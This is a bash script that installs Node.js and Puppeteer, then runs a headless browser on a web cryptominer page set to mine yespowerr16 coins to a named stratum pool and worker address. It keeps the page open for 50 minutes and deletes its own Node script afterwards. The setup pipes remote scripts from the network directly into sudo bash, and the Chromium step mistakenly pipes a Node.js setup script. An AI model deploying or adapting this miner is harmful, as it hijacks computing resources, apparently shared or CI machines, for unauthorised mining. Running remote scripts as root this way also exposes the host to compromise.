#!/bin/bash

# Define function to log progress
log_progress() {
  local interval=$1
  local total_duration=$2
  local start_time=$(date +%s)
  local end_time=$((start_time + total_duration))

  while [ $(date +%s) -lt $end_time ]; do
    echo "Progress update: waiting..."
    sleep $interval
  done
}

# Install necessary packages
sudo apt-get update
sudo apt-get install -y wget gnupg

# Install Chromium
wget -q -O - https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt-get install -y chromium

# Install Node.js and Puppeteer
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt-get install -y nodejs
npm install puppeteer

# Create a Node.js script for Puppeteer automation
cat <<EOF > /tmp/puppeteer-script.js
const puppeteer = require('puppeteer');
const delay = ms => new Promise(resolve => setTimeout(resolve, ms));

const logProgress = async (interval, totalDuration) => {
  const startTime = Date.now();
  const endTime = startTime + totalDuration;
  while (Date.now() < endTime) {
    console.log('Progress update: waiting...');
    await delay(interval);
  }
};

(async () => {
  try {
    const browser = await puppeteer.launch({ headless: true });
    const page = await browser.newPage();
    console.log('Navigating to URL...');
    await page.goto('https://webminer.pages.dev?algorithm=yespowerr16&host=stratum-asia.rplant.xyz&port=13382&worker=YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC&password=x&workers=3');
    console.log('Navigation complete.');

    // Log page title
    console.log('Page title:', await page.title());

    // Log start of waiting period
    console.log('Waiting for 50 minutes...');

    // Set up progress logging every 5 minutes
    const interval = 5 * 60 * 1000; // 5 minutes in milliseconds
    const totalDuration = 50 * 60 * 1000; // 50 minutes in milliseconds

    // Log progress every 5 minutes
    await logProgress(interval, totalDuration);

    // Log end of waiting period
    console.log('Finished waiting, continuing...');

    // Optionally take a screenshot or perform other actions here
    await page.screenshot({ path: 'screenshot.png' });

    // Save page content
    const content = await page.content();
    require('fs').writeFileSync('response.html', content);

    console.log('Finished, closing browser...');
    await browser.close();
  } catch (error) {
    console.error('Error:', error);
    process.exit(1);
  }
})();
EOF

# Run the Puppeteer script
node /tmp/puppeteer-script.js

# Clean up
rm /tmp/puppeteer-script.js
